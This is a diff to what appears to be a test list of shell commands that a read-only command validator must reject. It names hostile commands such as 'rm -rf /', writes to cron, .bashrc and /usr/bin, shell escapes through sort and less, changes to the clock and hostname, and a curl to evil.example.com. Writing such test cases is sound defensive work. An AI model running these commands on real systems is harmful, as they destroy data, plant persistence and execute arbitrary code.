@@ -9,23 +9,28 @@ awk 'BEGIN{system("rm -rf /")}'
 sed 's/a/b/' file.txt
 sed '1e id'
 
-# redirection defeats read-only intent even for otherwise-safe commands
-sort file.txt > /etc/cron.d/evil
-cat file.txt >> out.txt
-ls 2> /dev/null
-
-# redirection glued to adjacent text
-ls -la>>/root/.bashrc
-cat file.txt>out.txt
-sort<in.txt
->out.txt ls
-cat <>file.txt
+# commands that write or execute through their own flags or operands
+sort -o out.txt file
+sort -oout.txt file
+sort --output=out.txt file
+sort --compress-program=sh file
+uniq file.txt out.txt
+uniq - out.txt
+tree -o out.txt
+less +!sh x
+less -o out x
+date -s "2020-01-01"
+date 010112002020
+hostname newhost
+hostname -F file
 
 # find with forbidden flags
 find . -name "*.sh" -exec rm {} \;
 find . -execdir ls \;
 find . -prune
 find . -delete
+find . -fprint out.txt
+find . -fprint0 out.txt
 
 # escaped flags must still resolve to the forbidden flag they spell
 find . -e\xec rm {} \;
@@ -52,4 +57,9 @@ ls & rm -rf /
 # compound commands where at least one part is unsafe
 ls -la && rm -rf /
 find . -delete | grep foo
+
+# redirection on an earlier segment is still checked
+ls > ~/.bashrc && pwd
+cat file.txt > /usr/bin/evil | grep foo
+ls > out.txt ; rm -rf /
 ls ; curl http://evil.example.com
